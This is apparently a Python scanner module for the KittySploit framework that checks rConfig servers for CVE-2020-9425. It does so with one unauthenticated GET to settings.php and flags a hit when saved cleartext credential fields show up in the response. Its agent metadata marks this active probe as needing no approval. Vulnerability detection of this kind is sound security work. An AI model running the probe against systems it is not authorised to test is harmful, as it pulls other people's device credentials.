#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rConfig prior to version 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'rConfig <3.9.4 - Sensitive Information Disclosure Detection',
        'description': 'rConfig prior to version 3.9.4 is susceptible to sensitive information disclosure. An unauthenticated attacker can retrieve saved cleartext credentials via a GET request to settings.php. Because the application does not exit after a redirect is applied, the rest of the page still executes, resulting in the disclosure of cleartext credentials in the response.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rconfig.exposure', 'rconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.hivint.com/rconfig-3-9-3-unauthenticated-sensitive-information-disclosure-ead4ed88f153',
            'https://github.com/rconfig/rconfig/commit/20f4e3d87e84663d922b937842fddd9af1b68dd9',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-9425',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-9425',
    }

    def run(self):
        r = self.http_request(method="GET", path='/settings.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('defaultNodeUsername', 'defaultNodePassword',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="rConfig <3.9.4 - Sensitive Information Disclosure detected",
                path='/settings.php',
            )
            return True
        return False

